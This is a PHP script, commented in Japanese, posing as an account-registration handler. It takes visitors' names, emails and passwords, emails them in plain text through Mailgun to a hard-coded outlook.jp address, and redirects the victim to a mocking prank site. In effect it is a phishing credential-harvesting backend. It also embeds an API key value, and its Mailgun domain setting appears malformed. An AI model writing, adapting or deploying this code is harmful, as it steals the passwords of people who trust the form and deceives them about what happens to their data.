<?php
require 'vendor/autoload.php'; // Composerのオートローダーを読み込む

use Mailgun\Mailgun;

if ($_SERVER["REQUEST_METHOD"] == "POST") {
    $name = htmlspecialchars($_POST['name']);
    $email = htmlspecialchars($_POST['email']);
    $password = htmlspecialchars($_POST['password']);

    $mgClient = Mailgun::create('1b5736a5-b641be0b'); // MailgunのAPIキー
    $domain = "https://app.mailgun.com/app/sending/domains/sandbox2a8a2607eba4407a8e4dc1872e5542d5.mailgun.org"; // Mailgunで設定したドメインを指定

    $to = 'samuson846@outlook.jp';
    $subject = '新しいアカウント登録';
    $message = "名前: $name\nメールアドレス: $email\nパスワード: $password";

    try {
        $mgClient->messages()->send($domain, [
            'from'    => 'samuson846@outlook.jp', // 送信元のメールアドレス
            'to'      => $to,
            'subject' => $subject,
            'text'    => $message
        ]);

        header('Location: https://youareanidiot.cc/'); // リダイレクト先URLを指定
        exit();
    } catch (Exception $e) {
        echo 'メール送信に失敗しました: ' . $e->getMessage();
    }
}
?>
